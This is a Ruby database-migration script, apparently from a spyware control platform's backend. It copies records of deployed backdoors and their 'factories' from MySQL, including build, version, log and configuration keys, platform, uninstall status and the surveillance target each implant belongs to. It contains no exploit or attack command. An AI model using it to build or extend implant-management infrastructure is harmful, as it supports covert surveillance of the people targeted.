require 'rcs-db/db_layer'

module RCS
module DB

class BackdoorMigration
  extend Tracer
  
  def self.migrate(verbose)
  
    print "Migrating backdoors " unless verbose

    backdoors = DB.instance.mysql_query('SELECT * from `backdoor` ORDER BY `backdoor_id`;').to_a
    backdoors.each do |backdoor|

      trace :info, "Migrating backdoor '#{backdoor[:backdoor]}'." if verbose
      print "." unless verbose
      
      # is this a backdoor or a factory?!?!
      kind = (backdoor[:class] == 0) ? 'backdoor' : 'factory'
      
      # skip item if already migrated
      next if Item.count(conditions: {_mid: backdoor[:backdoor_id], _kind: kind}) != 0
      
      mb = ::Item.new
      mb[:_mid] = backdoor[:backdoor_id]
      mb.name = backdoor[:backdoor]
      mb.desc = backdoor[:desc]
      mb._kind = kind
      mb.status = backdoor[:status].downcase
      
      mb.build = backdoor[:build]
      
      mb.instance = backdoor[:instance] if kind == 'backdoor'
      mb.version = backdoor[:version] if kind == 'backdoor'
      
      mb.logkey = backdoor[:logkey]
      mb.confkey = backdoor[:confkey]
      mb.type = backdoor[:type].downcase
      
      if kind == 'backdoor'
        mb.platform = backdoor[:subtype].downcase
        mb.platform = 'windows' if ['win32', 'win64'].include? mb.platform
      end
      
      mb.deleted = (backdoor[:deleted] == 0) ? false : true
      mb.uninstalled = (backdoor[:uninstalled] == 0) ? false : true if kind == 'backdoor'
      
      mb.counter = backdoor[:counter] if kind == 'factory'
      
      mb.pathseed = backdoor[:pathseed]
      
      target = Item.where({_mid: backdoor[:target_id], _kind: 'target'}).first
      mb._path = target[:_path] + [ target[:_id] ]
      
      mb.save
      
    end
    
    puts " done." unless verbose
    
  end
end

end # ::DB
end # ::RCS
